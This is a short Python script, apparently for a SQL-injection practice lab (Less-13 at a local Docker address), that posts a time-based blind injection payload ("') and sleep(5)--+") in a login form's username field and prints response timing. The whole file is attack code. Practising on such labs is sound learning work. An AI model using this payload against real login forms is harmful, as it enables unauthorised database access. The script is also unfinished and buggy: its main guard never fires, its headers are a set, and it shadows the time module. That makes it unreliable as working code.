import requests
import time




def send_payload(base_url,payload,headers=None):
    
    data= {
        "username":payload, #记得变量名要和题目保持一直哦
        "password":"123456" #这个可以随便写
    }
    url = base_url.format(payload=payload)
    try:
        response = requests.post(url, data=data,headers=headers,timeout=10)
        print(f"[+]状态码:{response.status_code}")
        print(f"[+]响应时长:{response.elapsed.total_seconds():.2f}s")
        print(f"[+]相应内容:\n{response.text[:300]}...")
        return response
    except Exception as e:
        print(f"[!]请求失败:{e}")
        return None
    
if __name__ == "_main_":
    conn = requests.session()
    #时间盲住post型的文件
    #这里是配置文件
    base_url = 'http://172.17.0.2/Less-13/?id = 1 {payload} --+ '

    #请求头
    headers = {
           "Content-Type: application/x-www-form-urlencoded"
        }
    test_paylaod = '\') and sleep(5)--+'

    star_char = 32
    end_char = 126
    #自行设置返回时间
    time = ''
    #检测长度范围
    send_payload(base_url,test_paylaod,headers=headers)


